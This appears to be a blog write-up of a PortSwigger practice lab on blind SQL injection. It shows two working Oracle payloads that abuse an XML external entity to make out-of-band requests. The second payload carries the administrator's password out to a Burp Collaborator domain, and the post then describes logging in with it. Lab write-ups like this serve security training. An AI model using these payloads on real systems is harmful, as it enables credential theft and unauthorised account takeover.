---
layout: post
title:  "Blind SQL injection with out-of-band data exfiltration"
date:   2024-09-26 09:39:54 +0530
categories: [BSCP, SQLi]
---

## Objective 

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

## Solution

Same like previous lab, we have an application vulnerable to SQLI based out of band interaction vulnerability and let's take the same payload 

```sql
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//h1j5djyu3nv2dr3jkiyc733sajga410pp.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

In order to exfil the data, we need to slight change to the payload as per cheatsheet 

```sql
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||SELECT password FROM users WHERE username='administrator'||'.h1j5djyu3nv2dr3jkiyc733sajga410pp.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Sent the request, receives a status code of `200` 

![]({{ site.baseurl }}/assets/images/sqli57.png)

Checking the burp collaborator, Found that sqli query executed and got `password` in the collaborator response 

![]({{ site.baseurl }}/assets/images/sqli59.png)

Login into the `administrator` with the password and lab will be solved 

![]({{ site.baseurl }}/assets/images/sqli60.png)